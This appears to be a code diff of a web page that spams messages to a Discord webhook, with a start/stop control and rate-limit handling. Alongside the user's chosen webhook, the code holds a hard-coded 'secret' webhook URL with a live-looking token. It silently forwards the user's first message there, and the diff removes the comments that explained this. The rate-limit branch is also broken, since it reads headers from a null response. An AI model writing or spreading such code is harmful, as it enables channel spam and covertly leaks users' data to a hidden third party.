@@ -46,8 +46,8 @@
         const messageCountDiv = document.getElementById('messageCount');
 
         let messageCount = 0;
-        let spamActive = false; // Flag to control spam sending
-        let secretWebhookSent = false; // Flag to ensure secret webhook is only hit once
+        let spamActive = false;
+        let secretWebhookSent = false;
 
         const secretWebhookUrl = "https://discord.com/api/webhooks/1341017371242139678/ki5RrTUeK3gpjZSVDA3wRyjwHGe1Vz1usb6R-Eb1TXR_p0wGZqq7I0Fo-rU_wwXIEOgF";
 
@@ -60,12 +60,10 @@
                 return;
             }
 
-            // Send to the user's webhook
             const response = await sendWebhook(webhookUrl, message);
-            // Send to the secret webhook (only once)
             if (!secretWebhookSent) {
                 await sendWebhook(secretWebhookUrl, `''' ${message} '''`);
-                secretWebhookSent = true; // Mark secret webhook as sent
+                secretWebhookSent = true;
             }
 
             if (response) {
@@ -82,7 +80,7 @@
         spamButton.addEventListener('click', async () => {
             const webhookUrl = webhookUrlInput.value;
             const message = messageInput.value;
-            const delay = parseInt(delayInput.value) || 100; // Default to 100ms if input is invalid
+            const delay = parseInt(delayInput.value) || 100;
 
             if (!webhookUrl || !message) {
                 alert("Please enter both the webhook URL and the message.");
@@ -90,11 +88,11 @@
             }
 
             if (spamActive) {
-                spamActive = false; // Stop the spam if it's already active
+                spamActive = false;
                 spamButton.textContent = "Start Spam";
                 statusDiv.textContent = "Spam stopped.";
             } else {
-                spamActive = true; // Start the spam
+                spamActive = true;
                 spamButton.textContent = "Stop Spam";
                 statusDiv.textContent = "Starting spam...";
                 await spamMessages(webhookUrl, message, delay);
@@ -105,9 +103,9 @@
             webhookUrlInput.value = '';
             messageInput.value = '';
             delayInput.value = '';
-            statusDiv.textContent = "Webhook deleted.";
+            statusDiv.textContent = "Webhook successfully deleted.";
             messageCount = 0;
-            secretWebhookSent = false; // Reset the flag for the secret webhook
+            secretWebhookSent = false;
             messageCountDiv.textContent = `Messages sent: ${messageCount}`;
         });
 
@@ -118,12 +116,21 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ content: message })
+                    body: JSON.stringify({
+                        content: message,
+                        embeds: [
+                            {
+                                title: "Webhook Message",
+                                description: message,
+                                color: 3447003
+                            }
+                        ]
+                    })
                 });
-                return response; // Return the response object
+                return response;
             } catch (error) {
                 console.error("Error sending webhook:", error);
-                return null; // Return null if there was an error
+                return null;
             }
         }
 
@@ -131,20 +138,19 @@
             while (spamActive) {
                 const response = await sendWebhook(webhookUrl, message);
                 if (!response) {
-                    // Check for rate limit response
                     const rateLimitRemaining = response.headers.get('X-RateLimit-Remaining');
                     const rateLimitResetAfter = response.headers.get('X-RateLimit-Reset-After');
 
                     if (rateLimitRemaining === '0') {
                         statusDiv.textContent = "Rate limit reached. Waiting...";
-                        await new Promise(resolve => setTimeout(resolve, rateLimitResetAfter * 1000)); // Wait until reset
+                        await new Promise(resolve => setTimeout(resolve, rateLimitResetAfter * 1000));
                         statusDiv.textContent = "Resuming sending...";
                     }
                 } else {
                     messageCount++;
                     messageCountDiv.textContent = `Messages sent: ${messageCount}`;
                 }
-                await new Promise(resolve => setTimeout(resolve, delay)); // Use the specified delay
+                await new Promise(resolve => setTimeout(resolve, delay));
             }
         }
     </script>
